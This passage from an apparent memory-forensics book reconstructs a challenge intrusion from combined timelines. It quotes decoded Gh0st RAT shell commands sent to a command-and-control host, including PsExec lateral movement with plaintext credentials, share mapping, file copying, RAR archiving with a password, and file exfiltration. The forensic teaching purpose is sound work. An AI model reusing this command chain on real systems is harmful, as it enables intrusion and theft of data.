Adding the attacker’s commands to the timeline can help add yet another dimension of understanding of what happened on a machine. Now you’re ready to examine the entire combined timeline.

### Correlating the Traffic with the Timeline

Using the previous information about `PsExec` being used to execute commands on `IIS-SARIYADH-03`, you can search for any related artifacts within the timeline. Here you can see the `PsExec` commands that the attacker issued to `IIS` (IP 172.16.223.47):

```
Tue Nov 27 2012 00:05:48,macb,[Gh0st Decode] 
    172.16.150.20:1098->58.64.132.141:80 
SHELL: ps.exe \\172.16.223.47 -u sysbackup -p T1g3rsL10n5 -accpeteula 
    cmd /c ipconfig
Tue Nov 27 2012 00:05:48,macb,[Gh0st Decode] 
    172.16.150.20:1098->58.64.132.141:80 
SHELL: ps.exe \\172.16.223.47 -u sysbackup -p T1g3rsL10n5 -accpeteula 
    cmd /c ipconfig;;PsExec v1.98 -
 Execute processes remotely;Copyright (C) 2001-2010 Mark Russinovich;
 Sysinternals - www.sysinternals.com;
```

---

**NOTE**

Multilined, decrypted Gh0st output is delimited by semicolons to make it fit in one line for bodyfile format.

---

Here is the `PSEXESVC.EXE` file created on the IIS system:

```
Tue Nov 27 2012 00:05:48,macb,[IIS MFT FILE_NAME] WINDOWS\PSEXESVC.EXE 
    (Offset: 0x1da1b000)
Tue Nov 27 2012 00:05:48,macb,[IIS MFT STD_INFO] WINDOWS\PSEXESVC.EXE 
    (Offset: 0x1da1b000)
```

The service starts on `IIS`, including the output message from `PsExec` to the attacker’s shell as well as the `PSEXESVC.EXE` process starting on the `IIS` machine:

```
Tue Nov 27 2012 00:05:49,macb,[Gh0st Decode] 
    172.16.150.20:1098->58.64.132.141:80 
    SHELL: The file exists.;Connecting to 172.16.223.47...
Starting PsExec service on 172.16.223.47...
    Connecting with PsExec service on 172.16.223.47...
    Copying C:\WINDOWS\system32\ipconfig.exe to 172.16.223.47...
    Error copying C:\WINDOWS\system32\ipconfig.exe to remote system:;;
    C:\WINDOWS\webui>
Tue Nov 27 2012 00:05:49,0,macb,,0,0,0,[IIS PROCESS LastTrimTime] PSEXESVC.EXE 
    PID: 268/PPID: 528/POffset: 0x0237f2b0
Tue Nov 27 2012 00:05:49,0,.acb,,0,0,0,[IIS PROCESS] PSEXESVC.EXE 
    PID: 268/PPID: 528/POffset: 0x0237f2b0
Tue Nov 27 2012 00:05:49,0,.acb,,0,0,0,[IIS PROCESS] PSEXESVC.EXE 
    PID: 268/PPID: 528/POffset: 0x0dd2e2b0
Tue Nov 27 2012 00:05:49,0,.acb,,0,0,0,[IIS PROCESS] PSEXESVC.EXE 
    PID: 268/PPID: 528/POffset: 0x172de2b0
```

Some registry keys associated with `PsExec` are modified on `IIS-SARIYADH-03` at the same time the process is started:

```
Tue Nov 27 2012 00:05:49,0,.a..,0,0,0,0,[IIS Registry] 
$$$PROTO.HIV\ControlSet001\Enum\Root\LEGACY_PSEXESVC
Tue Nov 27 2012 00:05:49,0,.a..,0,0,0,0,[IIS Registry None] 
$$$PROTO.HIV\ControlSet001\Enum\Root\LEGACY_PSEXESVC\0000
Tue Nov 27 2012 00:05:49,0,.a..,0,0,0,0,[IIS Registry] 
$$$PROTO.HIV\ControlSet001\Services\PSEXESVC
Tue Nov 27 2012 00:05:49,0,.a..,0,0,0,0,[IIS Registry] 
$$$PROTO.HIV\ControlSet001\Services\PSEXESVC\Security
```

The attacker maps a network share from `IIS-SARIYADH-03` to the `z:` drive letter of the `FLD-SARIYADH-43` machine:

```
Tue Nov 27 2012 00:46:10,.a..,[FLD Registry] $$$PROTO.HIV\Network\z
Tue Nov 27 2012 00:46:10,macb,[FLD SYMLINK] 
Z:->\Device\LanmanRedirector\;Z:00000000000003e7\172.16.223.47\z 
    POffset: 284628328/Ptr: 1/Hnd: 0
```

Within 2 seconds, the `net use` command is used to map a network share from `IIS-SARIYADH-03` to the `z:` drive letter. The command results in a modification to the `Network\z` registry key that you saw earlier on the `ENG-USTXHOU-148` machine:

```
Tue Nov 27 2012 00:48:19,macb,[Gh0st Decode] 
172.16.150.20:1098->58.64.132.141:80 SHELL: net use z: \\172.16.223.47\z
Tue Nov 27 2012 00:48:20,.a..,[ENG Registry] $$$PROTO.HIV\Network\z
Tue Nov 27 2012 00:48:20,macb,[Gh0st Decode] 
    172.16.150.20:1098->58.64.132.141:80 SHELL: The command completed 
    successfully.;;;C:\WINDOWS\webui>
```

The attacker copies off files immediately after mapping the drive:

```
Tue Nov 27 2012 00:49:01,macb,[Gh0st Decode] 
    172.16.150.20:1098->58.64.132.141:80 SHELL: copy z:\system.dll .
Tue Nov 27 2012 00:49:01,macb,[Gh0st Decode] 
    172.16.150.20:1098->58.64.132.141:80 SHELL: 1 file(s) copied.;;
    C:\WINDOWS\webui>
Tue Nov 27 2012 00:49:01,macb,[ENG MFT FILE_NAME] WINDOWS\webui\system.dll 
    (Offset: 0x924e800)
 [snip]
Tue Nov 27 2012 00:57:20,macb,[Gh0st Decode] 
    172.16.150.20:1098->58.64.132.141:80 SHELL: copy z:\svchost.dll .
Tue Nov 27 2012 00:57:20,macb,[Gh0st Decode] 
    172.16.150.20:1098->58.64.132.141:80 SHELL: 1 file(s) copied.;;C:\
WINDOWS\webui>
Tue Nov 27 2012 00:57:20,.a..,[IIS MFT STD_INFO] WINDOWS\webui\svchost.dll 
    (Offset: 0x1dec3000)
Tue Nov 27 2012 00:57:20,macb,[ENG MFT FILE_NAME] WINDOWS\webui\svchost.dll 
    (Offset: 0x924ec00)
[snip]
Tue Nov 27 2012 01:01:39,macb,[Gh0st Decode] 
    172.16.150.20:1098->58.64.132.141:80 SHELL: copy z:\https.dll .
Tue Nov 27 2012 01:01:39,macb,[Gh0st Decode] 
    172.16.150.20:1098->58.64.132.141:80 SHELL: copy z:\https.dll .;        
    1 file(s) copied.;;C:\WINDOWS\webui>
Tue Nov 27 2012 01:01:39,macb,[ENG MFT FILE_NAME] WINDOWS\webui\https.dll 
    (Offset: 0x109cf7a8)
Tue Nov 27 2012 01:14:48,macb,[Gh0st Decode] 
    172.16.150.20:1098->58.64.132.141:80 SHELL: copy z:\ .
Tue Nov 27 2012 01:14:48,macb,[Gh0st Decode] 
    172.16.150.20:1098->58.64.132.141:80 SHELL: copy z:\netstat.dll .;        
    1 file(s) copied.;;C:\WINDOWS\webui>
Tue Nov 27 2012 01:14:48,macb,[ENG MFT FILE_NAME] WINDOWS\webui\netstat.dll 
    (Offset: 0x10b97400)
```

These were the same filenames used in the batch scripts found on `FLD-SARIYADH-43`. It appears the attacker executed the commands on `IIS-SARIYADH-03`. If you look at the combined timeline, you can see that both `system1.bat` and `system6.bat` are accessed on `FLD-SARIYADH-43` immediately before `PsExec` is run. At about the same time, the `net1.exe` command (a component of `net.exe`) is accessed on `IIS-SARIYADH-03`:

```
Tue Nov 27 2012 00:43:34,mac.,[FLD MFT STD_INFO] WINDOWS\system1.bat 
    (Offset: 0x1787f000)
Tue Nov 27 2012 00:43:45,macb,[FLD MFT FILE_NAME] WINDOWS\system6.bat 
    (Offset: 0x1787f800)
Tue Nov 27 2012 00:44:16,mac.,[FLD MFT STD_INFO] WINDOWS\Prefetch\PSEXE-~2.PF
Tue Nov 27 2012 00:44:16,.a..,[IIS MFT STD_INFO] WINDOWS\system32\net1.exe 
```

Given the changes to the registry on the `FLD-SARIYADH-43` machine associated with the network share, which occur shortly after the `net` command on the `IIS-SARIYADH-03` machine, you can conclude that the `system1.bat` file was executed on the `IIS-SARIYADH-03` machine via `PsExec`.

Later in the timeline, the `system2.bat` file is accessed on the `FLD-SARIYADH-43` machine; shortly thereafter, the `gs.exe` and `svchost.dll` files appear on the `IIS-SARIYADH-03` machine. This confirms that the `system2.bat` file was run on the `IIS-SARIYADH-03` machine because its code runs the `gs.exe` program and redirects its output into the `svchost.dll` file, which is then copied off to the `ENG-USTXHOU-148` machine, as you saw earlier:

```
Tue Nov 27 2012 00:53:29,368,macb,[FLD MFT FILE_NAME] WINDOWS\webui\system2.bat 
    (Offset: 0x1787fc00)
Tue Nov 27 2012 00:53:49,336,macb,[IIS MFT FILE_NAME] WINDOWS\webui\gs.exe 
    (Offset: 0x1be1d400)
Tue Nov 27 2012 00:55:41,344,macb,[IIS MFT FILE_NAME] WINDOWS\webui\svchost.dll 
    (Offset: 0x1dec3000)
Tue Nov 27 2012 00:57:20,macb,[Gh0st Decode] 
    172.16.150.20:1098->58.64.132.141:80 SHELL: copy z:\svchost.dll .
Tue Nov 27 2012 00:57:20,macb,[Gh0st Decode] 
    172.16.150.20:1098->58.64.132.141:80 SHELL:         
    1 file(s) copied.;;C:\WINDOWS\webui>
Tue Nov 27 2012 00:57:20,.a..,[IIS MFT STD_INFO] WINDOWS\webui\svchost.dll 
    (Offset: 0x1dec3000)
Tue Nov 27 2012 00:57:20,macb,[ENG MFT FILE_NAME] WINDOWS\webui\svchost.dll 
    (Offset: 0x924ec00)
```

Temporal artifacts associated with the `system3.bat` script executing can be observed on `IIS-SARIYADH-03`. First, the script is accessed on the `FLD-SARIYADH-43` machine, and then a burst of activity occurs on the `IIS-SARIYADH-03` machine as several directories are accessed. As discussed earlier in this chapter, the `system3.bat` script redirected output from a `dir` command looking for files with a `dwg` extension. You can see this in the following timeline output because several files are accessed as the script issues the recursive `dir` command:

```
Tue Nov 27 2012 00:59:00,352,macb,[FLD MFT FILE_NAME] WINDOWS\webui\system3.bat 
    (Offset: 0x1b773000)
Tue Nov 27 2012 01:00:27,600,.a..,[IIS MFT STD_INFO] 
    Documents and Settings\ADMINI~1 (Offset: 0x1d836800)
Tue Nov 27 2012 01:00:27,480,.a..,[IIS MFT STD_INFO] 
    Documents and Settings\ADMINI~1\Start Menu\Programs 
    (Offset: 0x1c5c08e000)
Tue Nov 27 2012 01:00:27,448,.a..,[IIS MFT STD_INFO] Documents and 
    Settings\ADMINI~1\Start Menu\Programs\Startup (Offset: 0x1c5e0c00)
Tue Nov 27 2012 01:00:27,824,.a..,[IIS MFT STD_INFO] Documents and Settings
    \ADMINI~1\Start Menu\Programs\Accessories\ENTERT~1 (Offset: 0x1ce3c400)
Tue Nov 27 2012 01:00:27,600,.a..,[IIS MFT STD_INFO] Documents and Settings
    \ADMINI~1\Start Menu\Programs\Accessories\ACCESS~1 (Offset: 0x1ce3c800)
Tue Nov 27 2012 01:00:27,472,.a..,[IIS MFT STD_INFO] Documents and Settings
    \ADMINI~1\SendTo (Offset: 0x1ce3cc00)
```

If you then search for the `system4.bat` file in the combined timeline, you will find evidence of its usage. After the `system4.bat` file is created and accessed on the `FLD-SARIYADH-43` machine, the `ra.exe` file appears on the `IIS-SARIYADH-03` machine as a result of the `system4.bat` script running via `PsExec`:

```
Tue Nov 27 2012 01:04:59,432,macb,[FLD MFT FILE_NAME] WINDOWS\webui\system4.bat 
    (Offset: 0x1b773400)
Tue Nov 27 2012 01:05:24,336,macb,[IIS MFT FILE_NAME] WINDOWS\webui\ra.exe 
    (Offset: 0x1bf7e000)
Tue Nov 27 2012 01:05:55,344,macb,-------------D-,0,0,10877,[IIS MFT FILE_NAME] 
Documents and Settings\SYSBAC~1\APPLIC~1\WinRAR (Offset: 0x1cedc400)
```

The WinRAR folder is created when the WinRAR program is run on a system. Based on the contents of `system4.bat`, files were compressed into the `netstat.dll` fake DLL with WinRAR, which was run with the following options (see [http://acritum.com/software/manuals/winrar/](http://acritum.com/software/manuals/winrar/)):

- `-hphclllsddlsdiddklljh`: The password is “hclllsddlsdiddklljh” and is set by `–hp`.
- `-r`: Recurse through directories.
- `-x*.dll`: Exclude DLL files.

Several files in the timeline with the `dwg` extension are accessed and the archive file (`netstat.dll`) is created:

```
Tue Nov 27 2012 01:11:20,.a..,[IIS MFT STD_INFO] 
ENGINE~1\Designs\Pumps\pump100.dwg (Offset: 0x1a890c00)
Tue Nov 27 2012 01:11:20,.a..,[IIS MFT STD_INFO] 
ENGINE~1\Designs\Pumps\pump11.dwg (Offset: 0x1a8fb800)
Tue Nov 27 2012 01:11:20,.a..,[IIS MFT STD_INFO] 
ENGINE~1\Designs\Pumps\pump12.dwg (Offset: 0x1a8fbc00)
Tue Nov 27 2012 01:11:20,.a..,[IIS MFT STD_INFO] 
ENGINE~1\Designs\Pumps\pump13.dwg (Offset: 0x1a18f000)
Tue Nov 27 2012 01:11:21,.a..,[IIS MFT STD_INFO] 
    ENGINE~1\Designs\Pumps\pump14.dwg (Offset: 0x1a18f400)
[snip]
Tue Nov 27 2012 01:11:39,.a..,[IIS MFT STD_INFO] 
ENGINE~1\Designs\Pumps\pump97.dwg (Offset: 0x25c78f000)
Tue Nov 27 2012 01:11:39,.a..,[IIS MFT STD_INFO] 
ENGINE~1\Designs\Pumps\pump98.dwg (Offset: 0x25f7c00)
Tue Nov 27 2012 01:11:40,.a..,[IIS MFT STD_INFO] 
    ENGINE~1\Designs\Pumps\pump99.dwg (Offset: 0x25c80f000)
Tue Nov 27 2012 01:11:40,mac.,[IIS MFT STD_INFO] 
WINDOWS\webui\netstat.dll (Offset: 0x1cedc800)
Tue Nov 27 2012 01:11:40,m...,[ENG MFT STD_INFO] 
WINDOWS\webui\netstat.dll (Offset: 0x10b97400)
```

The `netstat.dll` file (a RAR archive) is later downloaded to the attacker’s local machine over the command and control server:

```
Tue Nov 27 2012 01:15:44,macb,[Gh0st Decode] 
    172.16.150.20:1238->58.64.132.141:80 COMMAND: DOWN FILES 
    (C:\WINDOWS\webui\netstat.dll)
Tue Nov 27 2012 01:15:44,macb,[Gh0st Decode] 
    172.16.150.20:1238->58.64.132.141:80 TOKEN: FILE DATA (2713)
Tue Nov 27 2012 01:15:44,macb,[Gh0st Decode] 
    172.16.150.20:1238->58.64.132.141:80 TOKEN: FILE DATA (8183)
Tue Nov 27 2012 01:15:44,macb,[Gh0st Decode] 
    172.16.150.20:1238->58.64.132.141:80 TOKEN: FILE SIZE  
    (C:\WINDOWS\webui\netstat.dll: 109092)
Tue Nov 27 2012 01:15:44,macb,[Gh0st Decode] 
    172.16.150.20:1238->58.64.132.141:80 TOKEN: TRANSFER FINISH
```

### Wrapping Up the Case

In this case, you figured out the following from the timeline:

- The attacker had access to two machines (`ENG-USTXHOU-148` and `FLD-SARIYADH-43`) due to an executable that was sent by a phishing e-mail (`SYMANTEC-1.43-1[2].EXE`).
- The attacker modified credentials to move laterally to the third machine (`IIS-SARIYADH-03`).
- The attacker obtained information about the network and dumped hashes from all three machines.
- A network share from `IIS-SARIYADH-03` was mounted on both the `ENG-USTXHOU-148` and `FLD-SARIYADH-43`machines for copying off files back to the attacker.
- The attacker downloaded several files containing information about the network and password hashes as well as several (possibly proprietary) files with a `dwg` extension.
- Files were copied back to the (`ENG-USTXHOU-148`) machine and ultimately to the attacker’s machine.

---

**NOTE**

For more details on this forensic challenge, see the following resources:

- *Forensic Challenge 2* by TheLulzKittens: [http://thelulzkittens.blogspot.com/2012/11/jackcr-forensic-challenge-2-forensics.html](http://thelulzkittens.blogspot.com/2012/11/jackcr-forensic-challenge-2-forensics.html)
- Jack Crook’s blog (creator of the challenge): [http://blog.handlerdiaries.com](http://blog.handlerdiaries.com)

Also see Corey Harrell’s *Mr Silverlight Drive-by Meet Volatility Timelines* ([http://journeyintoir.blogspot.com/2014/05/mr-silverlight-drive-by-meet-volatility.html](http://journeyintoir.blogspot.com/2014/05/mr-silverlight-drive-by-meet-volatility.html)). Corey’s post was the first analysis we’ve seen that incorporated Tom Spencer’s new Update Sequence Number (USN) Journal parser plugin for Volatility ([https://github.com/tomspencer/volatility/tree/master/usnparser](https://github.com/tomspencer/volatility/tree/master/usnparser)).

---

## Summary

Creating timelines is a powerful analysis technique used during the reconstruction phase of digital investigations. It provides an extra layer of context about the relationships between artifacts and the temporal order in which events occurred. By combining temporal data found in memory with traditional sources, you get a more complete view of the digital crime scene and can develop stronger theories about what happened during the incident. The temporal relationships between digital artifacts also provide “temporal footprints” for rapidly identifying suspected systems.
